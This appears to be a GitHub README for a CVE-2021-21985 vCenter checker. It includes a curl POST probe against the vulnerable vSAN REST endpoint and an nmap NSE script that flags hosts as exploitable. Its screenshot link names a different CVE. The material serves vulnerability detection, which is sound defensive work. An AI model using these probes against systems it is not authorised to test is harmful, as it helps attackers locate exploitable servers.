# CVE-2021-21985 (PoC)
The vSphere Client (HTML5) contains a remote code execution vulnerability due to lack of input validation in the Virtual SAN Health Check plug-in which is enabled by default in vCenter Server.

Manual inspection: 

```
curl -s -k -X $'POST' 
-H $'Host: <target>' 
-H $'User-Agent: alex666' 
-H $'Content-Type: application/json' 
-H $'Connection: close' 
--data-binary $'{\"methodInput\":[{\"type\":\"ClusterComputeResource\",\"value\": null,\"serverGuid\": null}]}\x0d\x0a' 
$'https://<target>/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData'

```
# References: 
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21985 <br/>
https://www.vmware.com/security/advisories/VMSA-2021-0010.html <br/>

# CVE-2021-21985 (NSE checker)

This script looks the existence of CVE-2021-21985 based on CLASS/METHOD(s) available by default on vCenter e.g. "/ui/h5-vsan/rest/*" sending a POST request and looking in response body (200) JSON data.

# Usage
```nmap -p443 --script CVE-2021-21985.nse <target>```

# Output
```
---
-- @usage
-- nmap -p443 --script CVE-2021-21985.nse <target>
-- @output
-- PORT    STATE SERVICE
-- 443/tcp open  https
-- | CVE-2021-21985: 
-- |   VULNERABLE:
-- |   vCenter 6.5-7.0 RCE
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2021-21985
-- |       The vSphere Client (HTML5) contains a remote code execution vulnerability due to lack of input 
-- |       validation in the Virtual SAN Health Check plug-in which is enabled by default in vCenter Server.
-- |     Disclosure date: 2021-05-28
-- |     References:
-- |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21985
```

![Screen Recording](https://github.com/alt3kx/CVE-2021-21972/blob/main/CVE-2021-21972.gif)

# Author
Alex Hernandez aka <em><a href="https://twitter.com/_alt3kx_" rel="nofollow">(@\_alt3kx\_)</a></em>
